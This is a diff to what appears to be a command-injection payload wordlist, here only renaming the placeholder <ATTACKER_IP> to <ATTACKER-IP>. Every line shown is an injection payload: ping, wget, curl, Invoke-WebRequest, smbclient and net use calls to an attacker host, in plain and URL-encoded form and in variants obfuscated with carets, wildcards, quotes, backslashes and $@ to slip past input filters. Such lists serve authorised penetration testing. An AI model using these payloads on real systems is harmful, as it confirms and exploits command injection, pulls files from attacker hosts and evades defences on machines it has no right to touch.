@@ -6,10 +6,10 @@ ping+-c+1+<ATTACKER-IP>
 ping+-n+1+<ATTACKER-IP>
 wget http://<ATTACKER-IP>/HereWeAre
 wget+http://<ATTACKER-IP>/HereWeAre
-Invoke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-Invoke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
-curl -o hello.html http://<ATTACKER_IP>/HereWeAre
-curl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+Invoke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+Invoke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
+curl -o hello.html http://<ATTACKER-IP>/HereWeAre
+curl+-o+hello.html+http://<ATTACKER-IP>/HereWeAre
 smbclient //<ATTACKER-IP>/share -N
 smbclient+//<ATTACKER-IP>/share+-N
 net use \\<ATTACKER-IP>\share
@@ -44,8 +44,8 @@ sm\bclient+//<ATTACKER-IP>/share+-N
 == offuscamento ^ (solo per windows)
 pi^ng -n 1 <ATTACKER-IP>
 pi^ng+-n+1+<ATTACKER-IP>
-Inv^oke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-Inv^oke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+Inv^oke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+Inv^oke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
 ne^t use \\<ATTACKER-IP>\share
 ne^t+use+\\<ATTACKER-IP>\share
 
@@ -74,8 +74,8 @@ p*ing -c 1 <ATTACKER-IP>
 p*ing -n 1 <ATTACKER-IP>
 /usr/bin/wg*t http://<ATTACKER-IP>/HereWeAre
 /usr/bin/wg*t+http://<ATTACKER-IP>/HereWeAre
-Invo*ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
-cur*l+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+Invo*ke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
+cur*l+-o+hello.html+http://<ATTACKER-IP>/HereWeAre
 smbc*lient //<ATTACKER-IP>/share -N
 smbc*lient+//<ATTACKER-IP>/share+-N
 net u*se \\<ATTACKER-IP>\share
@@ -86,10 +86,10 @@ p''i'n'g+-c+1+<ATTACKER-IP>
 p''i'n'g -c 1 <ATTACKER-IP>
 w''g''et http://<ATTACKER-IP>/HereWeAre
 w''g''et+http://<ATTACKER-IP>/HereWeAre
-In''voke-Web''Request -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-cu''rl -o hello.html http://<ATTACKER_IP>/HereWeAre
-In''voke-Web''Request+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
-cu''rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+In''voke-Web''Request -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+cu''rl -o hello.html http://<ATTACKER-IP>/HereWeAre
+In''voke-Web''Request+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu''rl+-o+hello.html+http://<ATTACKER-IP>/HereWeAre
 sm''bclient //<ATTACKER-IP>/share -N
 sm''bclient+//<ATTACKER-IP>/share+-N
 ne''t use \\<ATTACKER-IP>\share
@@ -100,10 +100,10 @@ p\i\ng+-c+1+<ATTACKER-IP>
 p\i\ng -c 1 <ATTACKER-IP>
 wg\et http://<ATTACKER-IP>/HereWeAre
 wg\et+http://<ATTACKER-IP>/HereWeAre
-Invo\ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-cu\rl -o hello.html http://<ATTACKER_IP>/HereWeAre
-Invo\ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
-cu\rl+-o+hello.html http://<ATTACKER_IP>/HereWeAre
+Invo\ke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+cu\rl -o hello.html http://<ATTACKER-IP>/HereWeAre
+Invo\ke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu\rl+-o+hello.html http://<ATTACKER-IP>/HereWeAre
 sm\bclient //<ATTACKER-IP>/share -N
 sm\bclient+//<ATTACKER-IP>/share+-N
 ne\t use \\<ATTACKER-IP>\share
@@ -114,10 +114,10 @@ Pin$@g+-c+1+<ATTACKER-IP>
 pin$@g -c 1 <ATTACKER-IP>
 wg$@et http://<ATTACKER-IP>/HereWeAre
 wg$@et+http://<ATTACKER-IP>/HereWeAre
-Invo$@ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-cu$@rl -o hello.html http://<ATTACKER_IP>/HereWeAre
-Invo$@ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
-cu$@rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+Invo$@ke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+cu$@rl -o hello.html http://<ATTACKER-IP>/HereWeAre
+Invo$@ke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu$@rl+-o+hello.html+http://<ATTACKER-IP>/HereWeAre
 sm$@bclient //<ATTACKER-IP>/share -N
 smb$@client+//<ATTACKER-IP>/share+-N
 ne$@t use \\<ATTACKER-IP>\share
